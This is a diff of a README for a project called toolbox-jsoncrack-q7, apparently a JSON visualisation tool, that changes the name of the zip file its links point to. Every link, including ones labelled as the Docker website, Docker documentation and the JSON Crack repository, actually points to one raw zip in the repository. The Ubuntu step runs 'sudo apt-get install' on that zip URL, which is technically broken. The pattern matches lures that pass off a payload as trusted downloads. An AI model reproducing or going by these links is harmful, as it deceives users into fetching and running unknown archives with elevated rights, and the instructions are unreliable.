@@ -6,11 +6,11 @@ This guide will help you set up the toolbox-jsoncrack-q7 application on your com
 
 ## 🔗 Download Link
 
-[![Download toolbox-jsoncrack-q7](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip)](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip)
+[![Download toolbox-jsoncrack-q7](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip)](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip) to download the latest version of the application. 
 
 1. Click on the link above. 
 2. Look for the latest release.
@@ -22,7 +22,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Mrpi
 Before proceeding, ensure your system meets these requirements:
 
 - An operating system that supports Docker (Windows, macOS, or a distribution of Linux).
-- Docker installed on your machine. If you haven't installed Docker, you can follow the installation guide provided on the [Docker website](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip).
+- Docker installed on your machine. If you haven't installed Docker, you can follow the installation guide provided on the [Docker website](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip).
 
 ## 📦 Installing Docker
 
@@ -30,7 +30,7 @@ If you need Docker, follow these steps:
 
 ### For Windows and macOS:
 
-1. Visit the [Docker Desktop download page](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip).
+1. Visit the [Docker Desktop download page](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip).
 2. Download the correct version for your operating system.
 3. Open the installer and follow the prompts to complete the installation.
 
@@ -40,7 +40,7 @@ If you need Docker, follow these steps:
 2. Use the package manager for your distribution. For example, on Ubuntu, run:
     ```bash
     sudo apt-get update
-    sudo apt-get install https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip
+    sudo apt-get install https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip
     ```
 3. Start Docker:
     ```bash
@@ -91,7 +91,7 @@ For questions or support, please create an issue in the GitHub repository. The c
 
 ## 🔗 Additional Resources
 
-- [Docker Documentation](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip)
-- [JSON Crack GitHub Repository](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/toolbox-jsoncrack-q7.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip)
+- [JSON Crack GitHub Repository](https://raw.githubusercontent.com/Mrpickle499/toolbox-jsoncrack-q7/main/lardworm/q_toolbox_jsoncrack_1.6.zip)
 
 Thank you for using toolbox-jsoncrack-q7! Enjoy visualizing your JSON data easily and effectively.
